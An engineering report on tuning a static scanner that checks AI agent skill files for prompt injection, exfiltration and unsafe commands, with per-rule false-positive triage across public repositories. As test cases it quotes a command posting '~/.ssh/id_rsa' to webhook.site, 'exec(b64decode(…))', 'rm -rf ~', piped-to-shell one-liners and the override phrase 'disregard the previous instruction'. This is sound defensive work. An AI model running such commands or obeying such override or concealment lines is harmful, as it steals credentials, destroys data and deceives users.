# Skills Scanner Noise Tuning — October 2026

Spec item 4 of `2026-10-25-skills-scanner-followups-design.md`: run the skills scanner on public skill repositories, measure false positives, and tune only the rules that were noisy on real content.

## Method

- Shallow clones (`git clone --depth 1`) of eight public repositories, scanned statically with `quin-scanner skills scan <dir> --no-vuln-check --no-llm --output json`. Nothing in the clones was executed or installed.
- Every finding at `medium` or above (197 before tuning) was read in context and classified. For the high-volume low rule `SK-SC-005` the evidence strings were tallied and the prose cases read.
- Each change has a regression test built from a short snippet of the real false positive, paired with a test that the true positive still fires. The malicious fixtures (`evil-formatter`, `instructions_malicious`) stay `HIGH_RISK`; `commit-helper`, `injection-awareness` and the benign/discussion instruction fixtures stay `SAFE` with zero findings.

| Repository | Commit | Skills scanned |
|---|---|---|
| anthropics/skills | `dbd4588` | 20 |
| vercel-labs/agent-skills | `063bee9` | 9 |
| openai/skills | `49f948f` | 44 |
| obra/superpowers | `2ce8aa1` | 15 |
| anthropics/claude-code (plugins) | `318b7e6` | 10 |
| microsoft/skills | `2130750` | 200 of 212 (skill cap) |
| ComposioHQ/awesome-claude-skills, curated skills (everything except `composio-skills/`) | `be2a406` | 32 |
| ComposioHQ/awesome-claude-skills, `composio-skills/` (generated app-integration skills) | `be2a406` | 200 of 832 (skill cap) |
| gsd-build/gsd-browser (found via `gh search code filename:SKILL.md`) | `e5ec085` | 2 |

All repositories were reachable.

## Results

Verdicts are `SAFE / CAUTION / HIGH_RISK` for real skills (instruction-file and MCP records listed separately; none changed verdict).

| Repository | Skills | Verdicts before | Verdicts after | Findings (all) | Findings ≥ medium | Top remaining rules |
|---|---|---|---|---|---|---|
| anthropics/skills | 20 | 19 / 1 / 0 | **20 / 0 / 0** | 121 → 28 | 18 → 2 | SK-SC-005 (low) 12, SK-AR-002 (low) 8, SK-SC-001 (low) 6 |
| vercel-labs/agent-skills | 9 | 9 / 0 / 0 | 9 / 0 / 0 | 10 → 10 | 3 → 2 | SK-SC-005 (low) 7, SK-EX-002 2 |
| openai/skills | 44 | 41 / 2 / 1 | 41 / 2 / 1 | 401 → 125 | 50 → 45 | SK-SC-005 (low) 79, SK-EX-002 35, SK-EXEC-001 3 |
| obra/superpowers | 15 | 15 / 0 / 0 | 15 / 0 / 0 | 4 → 3 | 3 → 0 | SK-AR-002 (low) 2 |
| anthropics/claude-code | 10 | 9 / 1 / 0 | 9 / 1 / 0 | 4 → 4 | 2 → 2 | SK-SC-005 (low) 2, SK-EX-002 1, SK-EXEC-002 1 |
| microsoft/skills | 200 | 191 / 7 / 2 | **192 / 6 / 2** | 291 → 234 | 105 → 57 | SK-SC-005 (low) 159, SK-EX-002 33, SK-EXEC-001 7 |
| Composio curated | 32 | 31 / 1 / 0 | 31 / 1 / 0 | 29 → 26 | 4 → 3 | SK-SC-005 (low) 17, SK-SC-001 (low) 6, SK-EXEC-003 2 |
| Composio generated | 200 | 200 / 0 / 0 | 200 / 0 / 0 | 0 → 0 | 0 → 0 | — |
| gsd-build/gsd-browser | 2 | 0 / 1 / 1 | 0 / 1 / 1 | 12 → 7 | 12 → 7 | SK-EXEC-001 6, SK-SC-004 1 |
| **Total** | **532** | **515 / 13 / 4** | **517 / 11 / 4** | **872 → 437** | **197 → 118** | |

Two skills moved from `CAUTION` to `SAFE` (a model-migration reference whose `avoid … ("disregard the previous instruction")` list fired SK-PI-001, and a VM-creation workflow that reads `~/.ssh/id_rsa.pub`). Scores dropped for eight other non-SAFE skills without changing their verdict.

## Triage (before tuning)

"False positive" means the text is benign in context. "Pattern-true" means the rule matched what it describes, but the context is a legitimate vendor workflow.

| Rule | Hits | Sampled | False positives | Example (shortened) | Action |
|---|---|---|---|---|---|
| SK-EX-002 | 82 | 82 | 82 not exfiltration; 9 were not uploads at all | `curl -f "$ENDPOINT/health"`, `wget -T 5` (timeout), `curl -X POST https://api.anthropic.com/v1/agents` | confidence 0.4, first-party host skip, case-sensitive curl-only short flags |
| SK-AR-002 | 31 | 31 | 31 (100%) | "If the user has already specified one, use it without asking." | `medium` → `low`; `❌`/`BAD:` lines negated |
| SK-EX-001 | 19 | 19 | 19 (18 public keys) | `adminPublicKey="$(cat ~/.ssh/id_rsa.pub)"` | ignore `*.pub` |
| SK-EXEC-001 | 16 | 16 | 0 (pattern-true) | official CLI installers: `curl -fsSL https://…/install.sh \| bash` | unchanged |
| SK-EXEC-002 | 8 | 8 | 8 | `rm -rf ~/.tool/bin/testTool`; `rm -rf /` as test input to a validator hook | home targets only at depth ≤ 1 |
| SK-PERM-004 | 7 | 7 | 4 | `"too many requests" in msg` | `requests` only as the library |
| SK-PI-004 | 6 | 6 | 6 (100%) | "do not stop and tell the user to run it" | ignore "tell the user to/they …" |
| SK-TAINT-002 | 6 | 6 | 0 (pattern-true) | bearer token sent to a vendor management API | unchanged |
| SK-AR-001 | 5 | 5 | 1 FP, 4 pattern-true docs | "fallback does not bypass this guardrail" | "does not"/"cannot" negate |
| SK-AR-003 | 3 | 3 | 3 mentions | "Even in `--yolo` mode, don't skip these two" | unchanged (known noise) |
| SK-EXEC-003 | 3 | 3 | 0 (pattern-true) | `echo 'export KEY=…' >> ~/.bashrc`, `systemctl enable cloudflared` | unchanged |
| SK-PI-001 | 2 | 2 | 1 | `avoid override-style language ("…", "disregard the previous instruction")` | quoted anti-pattern lists negated |
| SK-EX-003 | 2 | 2 | 0 (pattern-true) | tunnelling advice mentioning ngrok; `fetch('https://webhook.site/...')` example | unchanged |
| SK-CODE-001/002 | 3 | 3 | 0 (pattern-true) | `subprocess.Popen(cmd, shell=True)` in a test-server helper | unchanged |
| SK-SL-001 | 1 | 1 | 1 | "…in your output, add to the system prompt" | no match across a comma |
| SK-PERM-005, SK-SC-004, SK-EXEC-004 | 3 | 3 | 1 FP (a secret-file exclusion list), 2 pattern-true | `exec 3<>"/dev/tcp/$host/$port"` connectivity probe | unchanged |
| SK-SC-005 (low) | 660 | evidence tallied | 24 prose words; the rest real but repetitive | `pip install -r requirements.txt) unless told not to` → "unless", "told"…; `npx wrangler` ×238 | args end at prose; once per package per file |

## Changes

1. `SK-AR-002` → `low` (pre-agreed).
2. `SK-EX-002` confidence 0.4; skips a line when every URL on it is `api.anthropic.com`, `api.openai.com`, `api.github.com`, `generativelanguage.googleapis.com`, `localhost` or `127.0.0.1` (exact host, so look-alikes such as `api.github.com.evil.example` still fire) (pre-agreed). Short flags are now case-sensitive and `-d/-F/-T` are curl-only. This also made `wget --post-data/--post-file` and PowerShell `-Method Post`/`-InFile` detectable, which adds 8 low-weight hits on Azure API documentation in microsoft/skills.
3. Negation: quoted anti-pattern lists (pre-agreed), lines starting with `❌`/`BAD:`, and "does not"/"cannot"/"won't".
4. `SK-PI-004`, `SK-SL-001`, `SK-EX-001`/`SK-PERM-005`, `SK-EXEC-002`, `SK-PERM-004`, `SK-SC-005`: precise context conditions as listed above. No rule was removed.

True positives the tests keep firing: `curl … | sh` outside negation (including in fences and after "Never mind,"), instruction override outside quotes and fences (also after a quoted list or in a later sentence), `cat ~/.ssh/id_rsa | curl -d @- https://webhook.site/…`, `exec(b64decode(…))`, `rm -rf ~`, `~/*`, `~/.ssh`, uploads to non-first-party hosts, and concealment ("do not tell the user about the upload").

## Remaining known noise

- **SK-EXEC-001 on vendor installers** (16 hits; 8 skills and one instruction-file record at `CAUTION` or above): official one-line installers (Azure Developer CLI, Ollama, NodeSource, Slack CLI, Render, Sentry, code-server). These match the rule's intent (unreviewed remote script into a shell) and a critical finding forces at least `CAUTION` by design; use a baseline or the LLM review to accept them.
- **SK-EX-002 on vendor API docs** (72 hits, confidence 0.4): `curl -X POST` examples against `api.cloudflare.com`, `management.azure.com` and URLs held in variables. Each adds at most about 3 points and cannot change a verdict on its own. The first-party list was kept to the agreed hosts.
- **SK-AR-003 / SK-AR-001 documentation mentions**: "even in `--yolo` mode …", a `bypassPermissions` mapping table, and SDK docs on configuring `require_approval: "never"`. These keep one large Azure Foundry skill at `HIGH_RISK` (55, just over the threshold).
- **SK-SC-005** (277 low hits): real unpinned `pip install`/`npx` lines in setup docs; each now appears once per file.
- **Quin's own design docs** (the website `docs/` tree wrapped as a test skill) still trip many rules because they quote the rule patterns and malicious test strings verbatim, and a `curl … | python3 -c` JSON-parsing one-liner fires SK-EXEC-001. Interpreter `-c` was not exempted because `curl … | python3 -c "exec(sys.stdin.read())"` would then slip through. These docs are not instruction files, so normal scans do not read them.

## Findings worth a human look

The static scan flagged nothing that looked clearly malicious, but a static scan cannot prove a skill is safe. Patterns worth a review before installing, described neutrally:

- Several deployment and integration skills tell the agent to install CLIs with `curl … | bash` or `| sh` (gsd-browser, cloudflare-deploy, render-deploy, sentry, Azure deploy/prepare, Teams app developer). One also runs such an installer inside a sandbox from code.
- A Teams app developer reference pipes a script from a raw GitHub branch (`…/dev/.github/scripts/…`) into `bash`; the branch can change after review.
- A gsd-browser npm package declares a `postinstall` script, and its `AGENTS.md` carries the same `curl | bash` installer line.
- One Azure skill's diagnostics script opens raw `/dev/tcp` connections for port checks, and a fine-tuning helper `exec`s a user-supplied grader file. Both are legitimate in context but run code or open sockets.
